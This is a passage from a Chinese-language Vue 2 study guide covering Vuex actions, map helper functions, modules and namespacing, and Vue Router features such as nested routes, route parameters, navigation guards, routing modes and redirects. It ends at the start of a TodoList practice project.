    }, 1000)
  }
}
```

Actions 支持同样的载荷方式和对象方式进行分发：

```js
// 以载荷形式分发
store.dispatch('incrementAsync', {
  amount: 10
})

// 以对象形式分发
store.dispatch({
  type: 'incrementAsync',
  amount: 10
})
```

来看一个更加实际的购物车示例，涉及到**调用异步 API** 和**分发多重 mutation**：

```js
actions: {
  checkout ({ commit, state }, products) {
    // 把当前购物车的物品备份起来
    const savedCartItems = [...state.cart.added]
    // 发出结账请求，然后乐观地清空购物车
    commit(types.CHECKOUT_REQUEST)
    // 购物 API 接受一个成功回调和一个失败回调
    shop.buyProducts(
      products,
      // 成功操作
      () => commit(types.CHECKOUT_SUCCESS),
      // 失败操作
      () => commit(types.CHECKOUT_FAILURE, savedCartItems)
    )
  }
}
```

注意我们正在进行一系列的异步操作，并且通过提交 mutation 来记录 action 产生的副作用（即状态变更）。



## 9.11：四个map方法的使用



### 1.mapState方法



<strong>mapState方法：</strong>用于帮助我们映射```state```中的数据为计算属性

```js
 computed: {
   //借助mapState生成计算属性：sum、school、subject（对象写法）
   ...mapState({sum:'sum',school:'school',subject:'subject'}),
            
   //借助mapState生成计算属性：sum、school、subject（数组写法）
   ...mapState(['sum','school','subject']),
},
```

等同于

```java
computed: {
    sum: function () {
      return this.$store.state.sum
    },
    school: function () {
      return this.$store.state.school
    }, subject: function () {
      return this.$store.state.subject
    },
}
```





### 2.mapGetters方法



<strong>mapGetters方法：</strong>用于帮助我们映射```getters```中的数据为计算属性



```js
computed: {
    //借助mapGetters生成计算属性：bigSum（对象写法）
    ...mapGetters({bigSum:'bigSum'}),

    //借助mapGetters生成计算属性：bigSum（数组写法）
    ...mapGetters(['bigSum'])
},
```



等同于



```java
computed: {
    bigSum:function (){
      return this.$store.getters.bigSum
    }
  }
```



### 3.mapActions方法



<strong>mapActions方法：</strong>用于帮助我们生成与```actions```对话的方法，即：包含```$store.dispatch(xxx)```的函数



```js
methods:{
    //靠mapActions生成：incrementOdd、incrementWait（对象形式）
    ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})

    //靠mapActions生成：incrementOdd、incrementWait（数组形式）
    ...mapActions(['jiaOdd','jiaWait'])
}
```



或者



```java
methods:{    
	incrementOdd() {
      this.$store.dispatch('jiaOdd', this.n)
    },    
    incrementWait() {
      this.$store.dispatch('jiaWait', this.n)
    }
}    
```



### 4.mapMutations



<strong>mapMutations方法：</strong>用于帮助我们生成与```mutations```对话的方法，即：包含```$store.commit(xxx)```的函数



```js
methods:{
    //靠mapActions生成：increment、decrement（对象形式）
    ...mapMutations({increment:'JIA',decrement:'JIAN'}),
    
    //靠mapMutations生成：JIA、JIAN（数组形式）
    ...mapMutations(['JIA','JIAN']),
}
```



等同于

```java
methods:{    
	increment() {
      this.$store.commit('JIA', this.n)
    },    
    decrement() {
      this.$store.dispatch('JIAN', this.n)
    }
}    
```





> 备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。



```java
<button class="btn btn-default" @click="increment(n)">加</button>
<button class="btn btn-default" @click="decrement(n)">减</button>
```





### 5.注意



**我们推荐使用数组的写法**





## 9.12：模块化



### 1.简介



由于使用单一状态树，应用的所有状态会集中到一个比较大的对象。当应用变得非常复杂时，store 对象就有可能变得相当臃肿。

为了解决以上问题，Vuex 允许我们将 store 分割成模块（module）。每个模块拥有自己的 state、mutation、action、getter、甚至是嵌套子模块——从上至下进行同样方式的分割：



```java
const moduleA = {
  state: () => ({ ... }),
  mutations: { ... },
  actions: { ... },
  getters: { ... }
}

const moduleB = {
  state: () => ({ ... }),
  mutations: { ... },
  actions: { ... }
}

const store = new Vuex.Store({
  modules: {
    a: moduleA,
    b: moduleB
  }
})

store.state.a // -> moduleA 的状态
store.state.b // -> moduleB 的状态
```





### 2.模块的局部状态



#### 对于模块内部的 mutation 和 getter，接收的第一个参数是**模块的局部状态对象**。



```js
const moduleA = {
  state: () => ({
    count: 0
  }),
  mutations: {
    increment (state) {
      // 这里的 `state` 对象是模块的局部状态
      state.count++
    }
  },

  getters: {
    doubleCount (state) {
      return state.count * 2
    }
  }
}
```



#### 同样，对于模块内部的 action，局部状态通过 `context.state` 暴露出来，根节点状态则为 `context.rootState`：



```js
const moduleA = {
  // ...
  actions: {
    incrementIfOddOnRootSum ({ state, commit, rootState }) {
      if ((state.count + rootState.count) % 2 === 1) {
        commit('increment')
      }
    }
  }
}
```



#### 对于模块内部的 getter，根节点状态会作为第三个参数暴露出来：



```js
const moduleA = {
  // ...
  getters: {
    sumWithRootCount (state, getters, rootState) {
      return state.count + rootState.count
    }
  }
}
```





#### 解释一下根节点



上面三小结提的根节点，是可以读取到其他的模块的state

例如：这是一个actions

```js
actions:{
    addPersonWang({ state, rootState },context) {
			console.log(state)
			console.log(rootState)
			console.log(rootState.personAbout.personList)
			console.log(context)
	}
}        
```

那么所说的根节点请看页面打印

<img src="images/image-20220118230717303.png" alt="image-20220118230717303" style="zoom:80%;" />



### 3.命名空间



#### 简介



默认情况下，模块内部的 action、mutation 和 getter 是注册在**全局命名空间**的——这样使得多个模块能够对同一 mutation 或 action 作出响应。

如果希望你的模块具有更高的封装度和复用性，你可以通过添加 `namespaced: true` 的方式使其成为带命名空间的模块。当模块被注册后，它的所有 getter、action 及 mutation 都会自动根据模块注册的路径调整命名。



#### 开启命名空间



```java
const countAbout = {
  namespaced:true,//开启命名空间
  state:{x:1},
  mutations: { ... },
  actions: { ... },
  getters: {
    bigSum(state){
       return state.sum * 10
    }
  }
}

const personAbout = {
  namespaced:true,//开启命名空间
  state:{ ... },
  mutations: { ... },
  actions: { ... }
}

const store = new Vuex.Store({
  modules: {
    countAbout,
    personAbout
  }
})
```





#### 开启命名空间后，组件中读取state数据：



```js
//方式一：自己直接读取
this.$store.state.personAbout.list
//方式二：借助mapState读取：
...mapState('countAbout',['sum','school','subject']),
```



#### 开启命名空间后，组件中读取getters数据：



```js
//方式一：自己直接读取
this.$store.getters['personAbout/firstPersonName']
//方式二：借助mapGetters读取：
...mapGetters('countAbout',['bigSum'])
```



#### 开启命名空间后，组件中调用dispatch



```js
//方式一：自己直接dispatch
this.$store.dispatch('personAbout/addPersonWang',person)
//方式二：借助mapActions：
...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
```



#### 开启命名空间后，组件中调用commit



```js
//方式一：自己直接commit
this.$store.commit('personAbout/ADD_PERSON',person)
//方式二：借助mapMutations：
...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
```



### 4.模块重用



有时我们可能需要创建一个模块的多个实例，例如：

- 创建多个 store，他们公用同一个模块 (例如当 `runInNewContext` 选项是 `false` 或 `'once'` 时，为了[在服务端渲染中避免有状态的单例 (opens new window)](https://ssr.vuejs.org/en/structure.html#avoid-stateful-singletons))
- 在一个 store 中多次注册同一个模块

如果我们使用一个纯对象来声明模块的状态，那么这个状态对象会通过引用被共享，导致状态对象被修改时 store 或模块间数据互相污染的问题。

实际上这和 Vue 组件内的 `data` 是同样的问题。因此解决办法也是相同的——使用一个函数来声明模块状态（仅 2.3.0+ 支持）：

```js
const MyReusableModule = {
  state: () => ({
    foo: 'bar'
  }),
  // mutation, action 和 getter 等等...
}
```



## 9.13：开发中项目结构



Vuex 并不限制你的代码结构。但是，它规定了一些需要遵守的规则：

1. 应用层级的状态应该集中到单个 store 对象中。
2. 提交 **mutation** 是更改状态的唯一方法，并且这个过程是同步的。
3. 异步逻辑都应该封装到 **action** 里面。

只要你遵守以上规则，如何组织代码随你便。如果你的 store 文件太大，只需将 action、mutation 和 getter 分割到单独的文件。

对于大型应用，我们会希望把 Vuex 相关代码分割到模块中。下面是项目结构示例：

```shell
├── index.html
├── main.js
├── api
│   └── ... # 抽取出API请求
├── components
│   ├── App.vue
│   └── ...
└── store
    ├── index.js          # 我们组装模块并导出 store 的地方
    ├── actions.js        # 根级别的 action
    ├── mutations.js      # 根级别的 mutation
    └── modules
        ├── cart.js       # 购物车模块
        └── products.js   # 产品模块
```





# 十、路由



## 10.1：简介



Vue Router 是 [Vue.js (opens new window)](http://cn.vuejs.org/)官方的路由管理器。它和 Vue.js 的核心深度集成，让构建单页面应用变得易如反掌。包含的功能有：

- 嵌套的路由/视图表
- 模块化的、基于组件的路由配置
- 路由参数、查询、通配符
- 基于 Vue.js 过渡系统的视图过渡效果
- 细粒度的导航控制
- 带有自动激活的 CSS class 的链接
- HTML5 历史模式或 hash 模式，在 IE9 中自动降级
- 自定义的滚动条行为



> 1. 理解： 一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。
> 2. 前端路由：key是路径，value是组件。



## 10.2：安装



```java
npm install vue-router
```



```java
import Vue from 'vue'
import VueRouter from 'vue-router'

Vue.use(VueRouter)
```



## 10.3：基本使用路由



### 1.main.js



```java
import Vue from 'vue'
import App from './App.vue'
import VueRouter from 'vue-router'
import {router} from "@/router"
import axios from 'axios'
Vue.use(VueRouter)
Vue.config.productionTip = false
new Vue({
    render: h => h(App),
    router:router
}).$mount('#app')
```



### 2.App.vue



```java
<template>
  <div>
    <div class="row">
      <div class="col-xs-offset-2 col-xs-8">
        <div class="page-header"><h2>Vue Router Demo</h2></div>
      </div>
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <router-link to="/about" active-class="active"  class="list-group-item">About</router-link>
          <router-link to="/home" active-class="active"  class="list-group-item ">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>
<script>
export default {
  name:'App',
}
</script>
```



### 3.About.vue



```java
<template>
  <div>
    <h1>我是About.vue页面</h1>
  </div>
</template>

<script>
export default {
  name: "About",
  data() {
    return {}
  }
}
</script>

<style scoped>

</style>
```



### 4.Home.vue



```java
<template>
    <div>    
        <h1>我是Home.vue页面</h1>
    </div>
</template>
<script>
export default {
  name: "Home",
  data(){
     return{}
  }
}
</script>
```



### 5.router/index.js



```java
import VueRouter from "vue-router"
import About from "@/components/About"
import Home from "@/components/Home";

export const router = new VueRouter({
        routes: [
            {
                path: '/home',
                component:Home
            },
            {
                path: '/about',
                component:About
            }
        ]
    })
;
```





### 6.项目结构



<img src="images/image-20220119115858161.png" alt="image-20220119115858161" style="zoom:80%;" />



### 7.测试



http://localhost:8080/#/about 

注意地址栏的`#`号

<img src="images/image-20220119115917475.png" alt="image-20220119115917475" style="zoom:80%;" />



## 10.4：几个注意点



1. 路由组件通常存放在```pages```文件夹，一般组件通常存放在```components```文件夹。
2. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
3. 每个组件都有自己的```$route```属性，里面存储着自己的路由信息。
4. 整个应用只有一个router，可以通过组件的```$router```属性获取到



## 10.5：多级路由





### 1.效果图



<img src="images/image-20220119163449182.png" alt="image-20220119163449182" style="zoom:80%;" />



### 2.Message.vue



```java
<template>
  <ul>
    <li>
      <a href="/message1">message001</a>&nbsp;&nbsp;
    </li>
    <li>
      <a href="/message2">message002</a>&nbsp;&nbsp;
    </li>
    <li>
      <a href="/message/3">message003</a>&nbsp;&nbsp;
    </li>
  </ul>
</template>

<script>
export default {
  name: "Message",
  data(){
     return{}
  }
}
</script>
<style scoped>
</style>
```



### 3.News



```java
<template>
  <ul>
    <li>news001</li>
    <li>news002</li>
    <li>news003</li>
  </ul>
</template>

<script>
export default {
  name: "News",
  data(){
     return{}
  }
}
</script>
```



### 4.Home.vue



```java
<template>
  <div class="panel-body">
    <div>
      <h2>Home组件内容</h2>
      <div>
        <ul class="nav nav-tabs">
          <li>
            <router-link active-class="active" class="list-group-item" to="/home/news">News</router-link>
          </li>
          <li>
            <router-link active-class="active" class="list-group-item" to="/home/message">Messages</router-link>
          </li>
        </ul>
        <div>
          <router-view></router-view>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
export default {
  name: "Home",
  data(){
     return{}
  }
}
</script>
<style scoped>
</style>
```



### 5.router/index.js



```java
import VueRouter from "vue-router"
import About from "@/components/About"
import Home from "@/components/Home";
import Message from "@/components/Message";
import News from "@/components/News";

export const router = new VueRouter({
        routes: [
            {
                path: '/home',
                component: Home,
                children: [
                    {
                        path: 'message',
                        component: Message
                    },
                    {
                        path: 'news',
                        component: News
                    }
                ]
            },
            {
                path: '/about',
                component: About
            }
        ]
    })
;
```





### 6.总结



+ 配置路由规则，使用children配置项



```js
routes:[
	{
		path:'/about',
		component:About,
	},
	{
		path:'/home',
		component:Home,
		children:[ //通过children配置子级路由
			{
				path:'news', //此处一定不要写：/news
				component:News
			},
			{
				path:'message',//此处一定不要写：/message
				component:Message
			}
		]
	}
]
```



+ 跳转（要写完整路径）



```vue
<router-link to="/home/news">News</router-link>
```



## 10.6：路由传参(query参数)



### 1.传递参数



```vue
<!-- 跳转并携带query参数，to的字符串写法  不推荐-->
<router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>
				
<!-- 跳转并携带query参数，to的对象写法 推荐 -->
<router-link 
	:to="{
		path:'/home/message/detail',
		query:{
		   id:666,
            title:'你好'
		}
	}"
>跳转</router-link>
```



### 2.接收参数



```js
$route.query.id
$route.query.title
```

**注意是`$route`不是`$router`**



### 3.案例



#### Message.vue



```java
<template>
  <div>
    <ul>
      <li v-for="(item) in messList" :key="item.id">
<!--        <router-link :to="`/home/message/detail?id=${item.id}&value=${item.value}`">{{item.value}}</router-link>-->
<!-- 推荐这种写法       -->
        <router-link :to="{
          path:'/home/message/detail',
          query:{
            id:item.id,
            value:item.value
          }
        }">{{item.value}}
        </router-link>
      </li>
    </ul>
    <hr>
    <router-view></router-view>
  </div>
</template>

<script>
export default {
  name: "Message",
  data(){
     return{
       messList:[
         {id:"001",value:'message001'},
         {id:"002",value:'message002'},
         {id:"003",value:'message003'}
       ]
     }
  }
}
</script>

```





#### Detail.vue



````java
<template>
<ul>
  <li>id:{{$route.query.id}}</li>
  <li>value:{{$route.query.value}}</li>
  <li>id:{{id}}</li>
  <li>value:{{value}}</li>
</ul>
</template>

<script>
export default {
  name: "Detail",
  data(){
     return{
       id:this.$route.query.id,
       value:this.$route.query.value,
     }
  },
  mounted() {
    console.log(this.$route)
    console.log(this.$router)
  }
}
</script>

<style scoped>

</style>
````



## 10.7：路由命名



### 1.简介



有时候，通过一个名称来标识一个路由显得更方便一些，特别是在链接一个路由，或者是执行一些跳转的时候。你可以在创建 Router 实例的时候，在 `routes` 配置中给某个路由设置名称。

```js
const router = new VueRouter({
  routes: [
    {
      path: '/user/:userId',
      name: 'user',
      component: User
    }
  ]
})
```

要链接到一个命名路由，可以给 `router-link` 的 `to` 属性传一个对象：

```html
<router-link :to="{ name: 'user', params: { userId: 123 }}">User</router-link>
```



### 2.作用



可以简化路由的跳转。



### 3.如何使用



#### 给路由命名



```js
{
	path:'/demo',
	component:Demo,
	children:[
		{
			path:'test',
			component:Test,
			children:[
				{
                      name:'hello' //给路由命名
					path:'welcome',
					component:Hello,
				}
			]
		}
	]
}
```



#### 简化跳转



```vue
<!--简化前，需要写完整的路径 -->
<router-link to="/demo/test/welcome">跳转</router-link>

<!--简化后，直接通过名字跳转 -->
<router-link :to="{name:'hello'}">跳转</router-link>

<!--简化写法配合传递参数 -->
<router-link 
	:to="{
		name:'hello',
		query:{
		   id:666,
            title:'你好'
		}
	}"
>跳转</router-link>
```



### 4.案例



#### router/index.js



```java
import VueRouter from "vue-router"
import About from "@/components/About"
import Home from "@/components/Home";
import Message from "@/components/Message";
import News from "@/components/News";
import Detail from "@/components/Detail";
export const router = new VueRouter({
        routes: [
            {
                path: '/home',
                component: Home,
                children: [
                    {
                        path: 'message',
                        component: Message,
                        children:[
                            {
                                name:'messageDetail',
                                path:'detail',
                                component:Detail
                            }
                        ]
                    },
                    {
                        path: 'news',
                        component: News
                    }
                ]
            },
            {
                name:'gaunyu',
                path: '/about',
                component: About
            }
        ]
    })
;
```





#### Detail.vue



```java
<template>
<ul>
  <li>id:{{$route.query.id}}</li>
  <li>value:{{$route.query.value}}</li>
  <li>id:{{id}}</li>
  <li>value:{{value}}</li>
</ul>
</template>

<script>
export default {
  name: "Detail",
  data(){
     return{
       id:this.$route.query.id,
       value:this.$route.query.value,
     }
  },
  mounted() {
    console.log(this.$route)
    console.log(this.$router)
  }
}
</script>

<style scoped>

</style>
```





## 10.8：路由传参(params)





### 1.配置路由，声明接收params参数



```js
{
	path:'/home',
	component:Home,
	children:[
		{
			path:'news',
			component:News
		},
		{
			component:Message,
			children:[
				{
					name:'xiangqing',
					path:'detail/:id/:title', //使用占位符声明接收params参数
					component:Detail
				}
			]
		}
	]
}
```



### 2.传递参数



```vue
<!-- 跳转并携带params参数，to的字符串写法 -->
<router-link :to="/home/message/detail/666/你好">跳转</router-link>
				
<!-- 跳转并携带params参数，to的对象写法 -->
<router-link 
	:to="{
		name:'xiangqing',
		params:{
		   id:666,
            title:'你好'
		}
	}"
>跳转</router-link>
```



### 3.注意



> 特别注意：路由携带**params参数时**，若使用**to的对象写法**，**则不能使用path配置项，必须使用name配置！**





## 10.9：路由传参



### 1.简介



​	作用：让路由组件更方便的收到参数

```js
{
	name:'xiangqing',
	path:'detail/:id',
	component:Detail,

	//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
	// props:{a:900}

	//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
	// props:true
	
	//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
	props(route){
		return {
			id:route.query.id,
			title:route.query.title
		}
	}
}
```



### 2.案例



#### route/index



```java
import VueRouter from "vue-router"
import About from "@/components/About"
import Home from "@/components/Home";
import Message from "@/components/Message";
import News from "@/components/News";
import Detail from "@/components/Detail";
export const router = new VueRouter({
        routes: [
            {
                path: '/home',
                component: Home,
                children: [
                    {
                        path: 'message',
                        component: Message,
                        children:[
                            {
                                name:'messageDetail',
                                path:'detail/:id/:value',
                                component:Detail,
                                props(route){
                                    console.log(route)
                                    return {
                                        id:route.params.id,
                                        value:route.params.value
                                    }
                                }
                            }
                        ]
                    },
                    {
                        path: 'news',
                        component: News
                    }
                ]
            },
            {
                name:'gaunyu',
                path: '/about',
                component: About
            }
        ]
    })
;
```



#### Detail.vue



```java
<template>
<ul>
<li>id:{{ id}}</li>
<li>value:{{ value}}</li>
</ul>
</template>
<script>
export default {
  name: "Detail",
  props:["id","value"],
  data(){
     return{
     }
  },
  computed:{
    ids(){
      return 1
    }
  }
}
</script>
<style scoped>
</style>
```





#### message.vue



```java
<template>
  <div>
    <ul>
      <li v-for="(item) in messList" :key="item.id">
        <router-link :to="{
          name:'messageDetail',
          params:{
            id:item.id,
            value:item.value
          }
        }">{{item.value}}
        </router-link>
      </li>
    </ul>
    <hr>
    <router-view></router-view>
  </div>
</template>
```



## 10.10：router-link标签的的replace属性



1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：分别为```push```和```replace```，```push```是追加历史记录，```replace```是替换当前记录。路由跳转时候默认为```push```
3. 如何开启```replace```模式：```<router-link replace .......>News</router-link>```

````java
<router-link replace  active-class="active" to="/home/message">Message</router-link>
````



## 10.11：编程式路由导航



1. 作用：不借助```<router-link> ```实现路由跳转，让路由跳转更加灵活

2. 具体编码：

   ```js
   //$router的两个API
   this.$router.push({
   	name:'xiangqing',
   		params:{
   			id:xxx,
   			title:xxx
   		}
   })
   
   this.$router.replace({
   	name:'xiangqing',
   		params:{
   			id:xxx,
   			title:xxx
   		}
   })
   this.$router.forward() //前进
   this.$router.back() //后退
   this.$router.go() //可前进也可后退
   ```





## 10.12：缓存路由组件



1. 作用：让不展示的路由组件保持挂载，不被销毁。

2. 具体编码：

   ```vue
   <keep-alive include="News"> 
       <router-view></router-view>
   </keep-alive>
   ```



## 10.13：两个新的生命周期钩子



1. 作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。
2. 具体名字：
   1. ```activated```路由组件被激活时触发。
   2. ```deactivated```路由组件失活时触发。



## 10.14：路由导航



### 1.简介



正如其名，`vue-router` 提供的导航守卫主要用来通过跳转或取消的方式守卫导航。有多种机会植入路由导航过程中：全局的, 单个路由独享的, 或者组件级的。

记住**参数或查询的改变并不会触发进入/离开的导航守卫**。你可以通过[观察 `$route` 对象](https://router.vuejs.org/zh/guide/essentials/dynamic-matching.html#响应路由参数的变化)来应对这些变化，或使用 `beforeRouteUpdate` 的组件内守卫。



### 2.全局前置守卫



你可以使用 `router.beforeEach` 注册一个全局前置守卫：

```js
const router = new VueRouter({ ... })

router.beforeEach((to, from, next) => {
  // ...
})
```

当一个导航触发时，全局前置守卫按照创建顺序调用。守卫是异步解析执行，此时导航在所有守卫 resolve 完之前一直处于 **等待中**。每个守卫方法接收三个参数：

- **`to: Route`**: 即将要进入的目标 [路由对象](https://router.vuejs.org/zh/api/#路由对象)
- **`from: Route`**: 当前导航正要离开的路由
- **`next: Function`**: 一定要调用该方法来 **resolve** 这个钩子。执行效果依赖 `next` 方法的调用参数。
  - **`next()`**: 进行管道中的下一个钩子。如果全部钩子执行完了，则导航的状态就是 **confirmed** (确认的)。
  - **`next(false)`**: 中断当前的导航。如果浏览器的 URL 改变了 (可能是用户手动或者浏览器后退按钮)，那么 URL 地址会重置到 `from` 路由对应的地址。
  - **`next('/')` 或者 `next({ path: '/' })`**: 跳转到一个不同的地址。当前的导航被中断，然后进行一个新的导航。你可以向 `next` 传递任意位置对象，且允许设置诸如 `replace: true`、`name: 'home'` 之类的选项以及任何用在 [`router-link` 的 `to` prop](https://router.vuejs.org/zh/api/#to) 或 [`router.push`](https://router.vuejs.org/zh/api/#router-push) 中的选项。
  - **`next(error)`**: (2.4.0+) 如果传入 `next` 的参数是一个 `Error` 实例，则导航会被终止且该错误会被传递给 [`router.onError()`](https://router.vuejs.org/zh/api/#router-onerror) 注册过的回调。

**确保 `next` 函数在任何给定的导航守卫中都被严格调用一次。它可以出现多于一次，但是只能在所有的逻辑路径都不重叠的情况下，否则钩子永远都不会被解析或报错**。这里有一个在用户未能验证身份时重定向到 `/login` 的示例：

```js
// BAD
router.beforeEach((to, from, next) => {
  if (to.name !== 'Login' && !isAuthenticated) next({ name: 'Login' })
  // 如果用户未能验证身份，则 `next` 会被调用两次
  next()
})
// GOOD
router.beforeEach((to, from, next) => {
  if (to.name !== 'Login' && !isAuthenticated) next({ name: 'Login' })
  else next()
})
```



### 3.全局解析守卫



> 2.5.0 新增

在 2.5.0+ 你可以用 `router.beforeResolve` 注册一个全局守卫。这和 `router.beforeEach` 类似，区别是在导航被确认之前，**同时在所有组件内守卫和异步路由组件被解析之后**，解析守卫就被调用。



### 4.全局后置钩子



你也可以注册全局后置钩子，然而和守卫不同的是，这些钩子不会接受 `next` 函数也不会改变导航本身：

```js
router.afterEach((to, from) => {
  // ...
})
```



### 5.路由独享的守卫



你可以在路由配置上直接定义 `beforeEnter` 守卫：

```js
const router = new VueRouter({
  routes: [
    {
      path: '/foo',
      component: Foo,
      beforeEnter: (to, from, next) => {
        // ...
      }
    }
  ]
})
```

这些守卫与全局前置守卫的方法参数是一样的。



### 6.组件内的守卫



最后，你可以在路由组件内直接定义以下路由导航守卫：

- `beforeRouteEnter`
- `beforeRouteUpdate` (2.2 新增)
- `beforeRouteLeave`

```js
const Foo = {
  template: `...`,
  beforeRouteEnter(to, from, next) {
    // 在渲染该组件的对应路由被 confirm 前调用
    // 不！能！获取组件实例 `this`
    // 因为当守卫执行前，组件实例还没被创建
  },
  beforeRouteUpdate(to, from, next) {
    // 在当前路由改变，但是该组件被复用时调用
    // 举例来说，对于一个带有动态参数的路径 /foo/:id，在 /foo/1 和 /foo/2 之间跳转的时候，
    // 由于会渲染同样的 Foo 组件，因此组件实例会被复用。而这个钩子就会在这个情况下被调用。
    // 可以访问组件实例 `this`
  },
  beforeRouteLeave(to, from, next) {
    // 导航离开该组件的对应路由时调用
    // 可以访问组件实例 `this`
  }
}
```

`beforeRouteEnter` 守卫 **不能** 访问 `this`，因为守卫在导航确认前被调用，因此即将登场的新组件还没被创建。

不过，你可以通过传一个回调给 `next`来访问组件实例。在导航被确认的时候执行回调，并且把组件实例作为回调方法的参数。

```js
beforeRouteEnter (to, from, next) {
  next(vm => {
    // 通过 `vm` 访问组件实例
  })
}
```

注意 `beforeRouteEnter` 是支持给 `next` 传递回调的唯一守卫。对于 `beforeRouteUpdate` 和 `beforeRouteLeave` 来说，`this` 已经可用了，所以**不支持**传递回调，因为没有必要了。

```js
beforeRouteUpdate (to, from, next) {
  // just use `this`
  this.name = to.params.name
  next()
}
```

这个离开守卫通常用来禁止用户在还未保存修改前突然离开。该导航可以通过 `next(false)` 来取消。

```js
beforeRouteLeave (to, from, next) {
  const answer = window.confirm('Do you really want to leave? you have unsaved changes!')
  if (answer) {
    next()
  } else {
    next(false)
  }
}
```



### 7.完整的导航解析流程



1. 导航被触发。
2. 在失活的组件里调用 `beforeRouteLeave` 守卫。
3. 调用全局的 `beforeEach` 守卫。
4. 在重用的组件里调用 `beforeRouteUpdate` 守卫 (2.2+)。
5. 在路由配置里调用 `beforeEnter`。
6. 解析异步路由组件。
7. 在被激活的组件里调用 `beforeRouteEnter`。
8. 调用全局的 `beforeResolve` 守卫 (2.5+)。
9. 导航被确认。
10. 调用全局的 `afterEach` 钩子。
11. 触发 DOM 更新。
12. 调用 `beforeRouteEnter` 守卫中传给 `next` 的回调函数，创建好的组件实例会作为回调函数的参数传入。



### 8.总结



1. 作用：对路由进行权限控制

2. 分类：全局守卫、独享守卫、组件内守卫

3. 全局守卫:


 ```js
   //全局前置守卫：初始化时执行、每次路由切换前执行
   router.beforeEach((to,from,next)=>{
   	console.log('beforeEach',to,from)
   	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
   		if(localStorage.getItem('school') === 'atguigu'){ //权限控制的具体规则
   			next() //放行
   		}else{
   			alert('暂无权限查看')
   			// next({name:'guanyu'})
   		}
   	}else{
   		next() //放行
   	}
   })
   
   //全局后置守卫：初始化时执行、每次路由切换后执行
   router.afterEach((to,from)=>{
   	console.log('afterEach',to,from)
   	if(to.meta.title){ 
   		document.title = to.meta.title //修改网页的title
   	}else{
   		document.title = 'vue_test'
   	}
   })
 ```



4. 独享守卫:




 ```js
   beforeEnter(to,from,next){
   	console.log('beforeEnter',to,from)
   	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
   		if(localStorage.getItem('school') === 'atguigu'){
   			next()
   		}else{
   			alert('暂无权限查看')
   			// next({name:'guanyu'})
   		}
   	}else{
   		next()
   	}
   }
 ```



5. 组件内守卫：



 ```js
   //进入守卫：通过路由规则，进入该组件时被调用
   beforeRouteEnter (to, from, next) {
   },
   //离开守卫：通过路由规则，离开该组件时被调用
   beforeRouteLeave (to, from, next) {
   }
 ```



## 10.15：路由器的两种工作模式



1. 对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。

2. hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。

3. hash模式：

   1. 地址中永远带着#号，不美观 。
   2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。
   3. 兼容性较好。

4. history模式：

   1. 地址干净，美观 。
   2. 兼容性和hash模式相比略差。
   3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。

    



## 10.16：路由重定向和别名



###  1.重定向



重定向也是通过 `routes` 配置来完成，下面例子是从 `/a` 重定向到 `/b`：

```js
const router = new VueRouter({
  routes: [
    { path: '/a', redirect: '/b' }
  ]
})
```

重定向的目标也可以是一个命名的路由：

```js
const router = new VueRouter({
  routes: [
    { path: '/a', redirect: { name: 'foo' }}
  ]
})
```

甚至是一个方法，动态返回重定向目标：

```js
const router = new VueRouter({
  routes: [
    { path: '/a', redirect: to => {
      // 方法接收 目标路由 作为参数
      // return 重定向的 字符串路径/路径对象
    }}
  ]
})
```

注意[导航守卫](https://router.vuejs.org/zh/guide/advanced/navigation-guards.html)并没有应用在跳转路由上，而仅仅应用在其目标上。在下面这个例子中，为 `/a` 路由添加一个 `beforeEnter` 守卫并不会有任何效果。

其它高级用法，请参考[例子 (opens new window)](https://github.com/vuejs/vue-router/blob/dev/examples/redirect/app.js)。



### 2.别名



“重定向”的意思是，当用户访问 `/a`时，URL 将会被替换成 `/b`，然后匹配路由为 `/b`，那么“别名”又是什么呢？

**`/a` 的别名是 `/b`，意味着，当用户访问 `/b` 时，URL 会保持为 `/b`，但是路由匹配则为 `/a`，就像用户访问 `/a` 一样。**

上面对应的路由配置为：

```js
const router = new VueRouter({
  routes: [
    { path: '/a', component: A, alias: '/b' }
  ]
})
```

“别名”的功能让你可以自由地将 UI 结构映射到任意的 URL，而不是受限于配置的嵌套路由结构。





# VUEUI库



移动端常用 UI 组件库 



1. Vant https://youzan.github.io/vant 

2. Cube UI https://didi.github.io/cube-ui 

3. Mint UI http://mint-ui.github.io

   

PC 端常用 UI 组件库



   1. Element UI https://element.eleme.cn 
      2. IView UI https://www.iviewui.co











# 项目练习：TodoList



## 目的



**组件化编码流程（通用）** 

1.实现静态组件：抽取组件，使用组件实现静态页面效果 

2.展示动态数据： 

2.1. 数据的类型、名称是什么？ 

2.2. 数据保存在哪个组件？ 

3.交互——从绑定事件监听开始



## 要先学到哪里





[学习到7.8：scoped(CSS样式](#7.8：scoped(CSS样式))之前



## 静态页面





### 基本文件



main.js什么的都不要变化



### App.vue



```java
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
          <MyHead></MyHead>
          <MyList></MyList>
          <MyFooter></MyFooter>
      </div>
    </div>
  </div>
</template>

<script>
import MyList from "@/components/todoList/MyList";
import MyFooter from "@/components/todoList/MyFooter";
import MyHead from "@/components/todoList/MyHeader";


export default {
  name: "App",
